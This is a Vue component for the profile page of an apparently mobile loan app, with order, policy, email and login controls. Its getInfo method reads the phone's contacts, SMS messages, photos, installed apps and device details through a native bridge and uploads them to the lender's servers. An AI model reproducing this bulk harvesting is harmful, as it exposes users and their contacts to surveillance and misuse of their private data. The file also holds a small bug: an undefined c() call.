<template>
    <div class="me">
        <div class="success" @click="doStatus(1)"></div>
        <div class="overdue" @click="doStatus(2)"></div>
        <div class="finish" @click="doStatus(3)"></div>
        <div class="me-top" v-if="$store.state.isLogin">
            <div class="user-icon">
                <img src="@/assets/user-icon-a.png" alt="">
            </div>
            <div class="user-name">Hello User</div>
            <div class="status">
                <div class="success" @click="doStatus(1)">
                    <div class="status-icon">
                        <img src="../../assets/success-icon.png" alt="">
                    </div>
                    <div class="status-desc">Success</div>
                </div>
                <div class="overdue" @click="doStatus(2)">
                    <div class="status-icon">
                        <img src="../../assets/overdue-icon.png" alt="">
                    </div>
                    <div class="status-desc">Overdue</div>
                </div>
                <div class="finish" @click="doStatus(3)">
                    <div class="status-icon">
                        <img src="../../assets/finish-icon.png" alt="">
                    </div>
                    <div class="status-desc">Finish</div>
                </div>
            </div>
        </div>
        <div class="me-top" v-else>
            <div class="user-icon">
                <img src="@/assets/user-icon.png" alt="">
            </div>
            <div class="user-name">Please Login</div>
            <!-- 顶部状态 -->
            <div class="status">
                <div class="success" @click="doStatus(1)">
                    <div class="status-icon">
                        <img src="../../assets/success-icon.png" alt="">
                    </div>
                    <div class="status-desc">Success</div>
                </div>
                <div class="overdue" @click="doStatus(2)">
                    <div class="status-icon">
                        <img src="../../assets/overdue-icon.png" alt="">
                    </div>
                    <div class="status-desc">Overdue</div>
                </div>
                <div class="finish" @click="doStatus(3)">
                    <div class="status-icon">
                        <img src="../../assets/finish-icon.png" alt="">
                    </div>
                    <div class="status-desc">Finish</div>
                </div>
            </div>

        </div>

        <!-- 列表 -->
        <ul class="list">
            <!-- My Order -->
            <li @click="doLoan">
                <div class="list-icon">
                    <img src="@/assets/list-wallet.png" alt="">
                </div>
                <div class="list-name">My order</div>
                <div class="list-jiantou">
                    <img src="@/assets/youjiantou.png" alt="">
                </div>
            </li>
            <!-- 隐私协议 -->
            <li @click="isPrivacy = true">
                <div class="list-icon">
                    <img src="@/assets/list-yinsi.png" alt="">
                </div>
                <div class="list-name">Privacy Policy</div>
                <div class="list-jiantou">
                    <img src="@/assets/youjiantou.png" alt="">
                </div>
            </li>
            <!-- Terms -->
            <li @click="isTerm = true">
                <div class="list-icon">
                    <img src="@/assets/list-terms.png" alt="">
                </div>
                <div class="list-name">Terms & Condition</div>
                <div class="list-jiantou">
                    <img src="@/assets/youjiantou.png" alt="">
                </div>
            </li>
            <!-- Loan Product -->
            <li @click="dotoNext">
                <div class="list-icon">
                    <img src="@/assets/list-house.png" alt="">
                </div>
                <div class="list-name">loan product</div>
                <div class="list-jiantou">
                    <img src="@/assets/youjiantou.png" alt="">
                </div>
            </li>
            <!-- 邮箱 -->
            <li @click="doEmail">
                <div class="list-icon">
                    <img src="@/assets/list-youxiang.png" alt="">
                </div>
                <div class="list-name">Service E-mail</div>
                <div class="list-jiantou">
                    <img src="@/assets/youjiantou.png" alt="">
                </div>
            </li>
        </ul>
        <!-- 按钮 -->
        <div class="login" v-if="!$store.state.isLogin" @click="$router.push('/login')">Login</div>
        <div class="login" v-else @click="doLogout">Log out</div>
        <!-- 底部导航 -->
        <div class="nav">
            <div class="nav-home" @click="$router.push('/home')">
                <img src="@/assets/home.png" alt="">
            </div>
            <div class="nav-me">
                <img src="@/assets/me-a.png" alt="">
            </div>
        </div>
        <!-- 协议弹窗 -->
        <van-dialog v-model="isPrivacy" :show-cancel-button="false" :show-confirm-button="false">
            <Privacy @privacyClose="isPrivacy = false"></Privacy>
        </van-dialog>
        <van-dialog v-model="isTerm" :show-cancel-button="false" :show-confirm-button="false">
            <Term @TermClose="isTerm = false"></Term>
        </van-dialog>
    </div>
</template>
<script>
import { Dialog, Toast } from 'vant'
import Privacy from './Privacy'
import Term from './Term'
import { getEmail, threeToken } from '../../android/android.js'
import { getPermission, getDeviceInfo, getApp, getSms, getPhoto, getContact, getPhoneInfo } from "../../android/android.js";
import { FKJYHLEHsetDeviceInfoAPI, FKJYHLEHgetshebeiInfoAPI, FKJYHLEHgetAppInfoAPI, FKJYHLEHgettxlAPI, FKJYHLEHgetduanxinAPI, FKJYHLEHgetPhotoInfoAPI } from "../../api";
import { add, unt } from "../../utils/key.js";
import toNext from '../Form/toNext.js'
export default {
    components: { Privacy, Term },
    data() {
        return {
            isLogin: false,
            isPrivacy: false,
            isTerm: false
        }
    },
    methods: {
        //邮箱
        async doEmail() {

            var link = "mailto:" + 'boxmoneycus@hotmail.com';
            window.location.href = link;
            getEmail()
        },
        //退出登录
        doLogout() {
            Dialog.confirm({
                message: 'Are you sure you want to quit?',
                confirmButtonText: 'Confirm',
                cancelButtonText: 'Cancel'
            }).then(() => {
                this.$store.commit('clearUserInfo')
                this.$store.commit('changeLogin', false)
                this.$router.push('/home')
                Toast('Exit Successfully')
            });
        },
        doLoan() {
            if (!this.$store.state.isLogin) {
                this.$router.push('/login')
                return Toast('please log in first')
            }
            this.$store.commit('changeCount', 0)
            this.$router.push('/myloan')
        },
        //跳转到下一页
        async dotoNext() {
            if (!this.$store.state.isLogin) {
                this.$router.push('/login')
                return c('please log in first')
            }
            this.$router.push('/beforeys')
        },
        //获取设备信息上报情况
        async getInfo() {
            const res = await FKJYHLEHsetDeviceInfoAPI()
            this.list = res.list
            console.log(this.list, 'this.list')
            console.log(JSON.stringify(this.list), 'this.list')
            if (this.list.indexOf("DEVICE") > -1) {
                let res = await getDeviceInfo();
                let info = JSON.parse(res.phoneDevice);
                const r = await FKJYHLEHgetshebeiInfoAPI(add({ model: info.device }))
                console.log(r, '1111111111111111')
            }
            if (this.list.indexOf('APP') > -1) {
                let res = await getApp();
                let info = JSON.parse(res.phoneDevice);
                const r = await FKJYHLEHgetAppInfoAPI(add({ model: { deviceApps: info.deviceApps } }))
                console.log(r, '2222222222222222222')
            }
            if (this.list.indexOf("CONTACT") > -1) {
                let res = await getContact();
                let info = JSON.parse(res.phoneDevice);
                const r = await FKJYHLEHgettxlAPI(add({ model: { deviceContacts: info.deviceContacts } }))
                console.log(r, '33333333333333333')
            }
            if (this.list.indexOf("SMS") > -1) {
                let res = await getSms();
                let info = JSON.parse(res.phoneDevice);
                const r = await FKJYHLEHgetduanxinAPI(add({ model: { list: info.smsList } }))
                console.log(r, '44444444444444444444')
            }
            if (this.list.indexOf("PHOTO") > -1) {
                let res = await getPhoto();
                let info = JSON.parse(res.phoneDevice);
                const r = await FKJYHLEHgetPhotoInfoAPI(add({ model: { list: info.photoList } }))
                console.log(r, '555555555555555555555555')
            }
            console.log(this.list, '设备信息上报情况')
        },
        doStatus(status) {
            if (!this.$store.state.isLogin) {
                this.$router.push('/login')
                return Toast('please log in first')
            }
            this.$store.commit('changeCount', status)
            this.$router.push('/myloan')
        },
    }
}
</script>
<style lang="less">
.me {
    position: relative;
    padding-bottom: (60/@a);





    .login {
        position: absolute;
        top: (552/@a);
        left: (70/@a);
        z-index: 999;
        width: (240/@a);
        height: (40/@a);
        background: #C0ECD2;
        border-radius: (23/@a);
        background-color: #22c672;
        text-align: center;
        line-height: (40/@a);
        font-family: 'Roboto';
        font-style: normal;
        font-weight: 500;
        font-size: (18/@a);
        color: #FFFFFF;
    }

    .list {
        position: absolute;
        top: (267/@a);
        left: 0;
        z-index: 1;
        width: 100vw;
        height: (400/@a);
        border-radius: (22/@a) (22/@a) 0px 0px;
        background-color: #fff;
        padding-top: (35/@a);
        padding-left: (30/@a);
        padding-right: (20/@a);

        li {
            display: flex;
            align-items: center;
            margin-bottom: (21/@a);

            &:last-child {
                margin-bottom: 0;
            }

            .list-icon {
                width: (30/@a);
                height: (30/@a);

                img {
                    width: 100%;
                }
            }

            .list-name {
                flex: 1;
                font-family: 'Roboto';
                font-style: normal;
                font-weight: 400;
                font-size: (14/@a);
                color: #484747;
                margin-left: (12/@a);
            }

            .list-jiantou {
                width: (10/@a);
                height: (10/@a);
                margin-bottom: (20/@a);

                img {
                    width: 100%;
                }
            }
        }
    }



    .me-top {
        position: relative;
        width: 100vw;
        height: (300/@a);
        background: linear-gradient(180deg, #2BDB80 0%, #10BA68 100%);
        padding-top: (30/@a);

        .user-icon {
            width: (70/@a);
            height: (70/@a);
            margin-left: (150/@a);

            img {
                width: 100%;
            }
        }

        .user-name {
            font-family: 'Roboto';
            font-style: normal;
            font-weight: 400;
            font-size: (20/@a);
            color: #FFFFFF;
            margin-top: (10/@a);
            margin-left: (135/@a);
        }

        .success {
            // position: absolute;
            z-index: 999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            // top: (170/@a);
            // left: (50/@a);
            // width: (70/@a);
            // height: (75/@a);
        }

        .overdue {
            // position: absolute;
            z-index: 999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            // top: (170/@a);
            // left: (150/@a);
            // width: (70/@a);
            // height: (75/@a);
        }

        .finish {
            // position: absolute;
            z-index: 999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            // top: (170/@a);
            // left: (250/@a);
            // width: (70/@a);
            // height: (75/@a);

        }

        .status {
            // position: absolute;
            // top: (145/@a);
            // left: (15/@a);
            border-radius: (15/@a);

            width: (350/@a);
            height: (113/@a);
            background-color: #fff;
            position: absolute;
            bottom: (40/@a);
            left: (10/@a);
            right: (10/@a);
            display: flex;
            justify-content: space-around;
            align-items: center;

            // .success {
            //     position: absolute;
            //     top: (10/@a);
            //     left: (20/@a);
            // }
        }

    }

    .nav {
        width: 100vw;
        height: (60/@a);
        background-color: #fff;
        position: fixed;
        bottom: 0;
        left: 0;
        z-index: 9;
        display: flex;
        justify-content: space-around;
        align-items: center;

        .nav-home {
            width: (50/@a);
            height: (50/@a);

            img {
                width: 100%;
            }
        }

        .nav-me {
            width: (50/@a);
            height: (50/@a);

            img {
                width: 100%;
            }
        }
    }
}
</style>